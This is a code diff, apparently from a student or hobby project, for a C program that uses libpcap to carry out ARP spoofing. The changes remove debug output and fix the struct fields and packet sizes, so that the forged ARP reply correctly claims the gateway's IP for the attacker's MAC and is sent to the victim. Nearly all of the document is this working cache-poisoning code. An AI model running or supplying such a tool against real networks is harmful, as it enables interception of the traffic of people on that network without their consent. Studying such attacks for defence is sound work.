@@ -87,10 +87,9 @@ int main(int argc, char * argv[])
 	struct sockaddr_in * gateway_ip=NULL;
 	const u_char *data;
 	int result;
-	struct in_addr victim_ip, test_ip;
+	struct in_addr victim_ip;
 	ether_header * cmp_ethernet;
 	ether_arp * cmp_arp;
-	char * test;
 	
 	victim_mac=(unsigned char *)malloc(ETH_ALEN);
 	attacker_ip=(sockaddr_in *)malloc(16);
@@ -139,17 +138,11 @@ int main(int argc, char * argv[])
 	ether_aton_r("00:00:00:00:00:00",(ether_addr *)arp_header.arp_tha);
 	memcpy(arp_header.arp_spa,&attacker_ip->sin_addr,sizeof(in_addr));
 	memcpy(arp_header.arp_tpa,&victim_ip,sizeof(in_addr));	
-	memcpy(arp_reqpack+14,&arp_header,sizeof(arphdr));
+	memcpy(arp_reqpack+14,&arp_header,sizeof(ether_arp));
 	
-//aa
-	memcpy(&test_ip, arp_header.arp_tpa,sizeof(in_addr));
-	test=inet_ntoa(test_ip);	
-	printf("%s",test);
 
 	while(1)
-	{	printf("1\n");
-
-
+	{	
 		if(pcap_sendpacket(handle, arp_reqpack, sizeof(ether_arp)+sizeof(ether_header)) != 0  )
         	{
                		 printf("fail to send packet");
@@ -159,19 +152,16 @@ int main(int argc, char * argv[])
 		result=pcap_next_ex(handle, &header, &data);
 		if(result != 1)
 			continue;
-		printf("dd");
 
 		cmp_ethernet=(ether_header *)data;
 
 		if(ntohs(cmp_ethernet->ether_type) !=0x0806)
 			continue;
-		printf("2 \n");
 
 		cmp_arp=(ether_arp *)(data+14);
 
 		if(ntohs(cmp_arp->arp_op) != ARPOP_REPLY)
 			continue;
-		printf("3");
 
 		memcpy(&test_ip,cmp_arp->arp_spa, sizeof(in_addr));
 		test=inet_ntoa(victim_ip);
@@ -188,7 +178,7 @@ int main(int argc, char * argv[])
 
 	memcpy(ethernet_spoof.ether_shost,attacker_mac,ETHER_ADDR_LEN);
         memcpy(ethernet_spoof.ether_dhost, victim_mac,ETHER_ADDR_LEN);
-        ethernet.ether_type= (unsigned int)htons(0x0806);
+        ethernet_spoof.ether_type= (unsigned int)htons(0x0806);
 
         memcpy(arp_spoofpack,&ethernet_spoof,sizeof(struct ether_header));
 
@@ -196,15 +186,15 @@ int main(int argc, char * argv[])
         arp_header_spoof.arp_pro=htons(ETHERTYPE_IP);
         arp_header_spoof.arp_hln=ETHER_ADDR_LEN;
         arp_header_spoof.arp_pln=sizeof(struct in_addr);
-        arp_header.arp_op=htons(ARPOP_REPLY);
+        arp_header_spoof.arp_op=htons(ARPOP_REPLY);
         memcpy(arp_header_spoof.arp_sha,attacker_mac,ETHER_ADDR_LEN);
         memcpy(arp_header_spoof.arp_tha,victim_mac,ETHER_ADDR_LEN);
         memcpy(arp_header_spoof.arp_spa,&gateway_ip->sin_addr,sizeof(in_addr));
-        memcpy(arp_header.arp_tpa,&victim_ip,sizeof(in_addr));
+        memcpy(arp_header_spoof.arp_tpa,&victim_ip,sizeof(in_addr));
 
-        memcpy(arp_spoofpack+14,&arp_header_spoof,sizeof(arphdr));
+        memcpy(arp_spoofpack+14,&arp_header_spoof,sizeof(ether_arp));
 
-	pcap_sendpacket(handle, arp_spoofpack, sizeof(arphdr)+sizeof(ether_header));
+	pcap_sendpacket(handle, arp_spoofpack, sizeof(ether_arp)+sizeof(ether_header));
 
 
 	return 0;
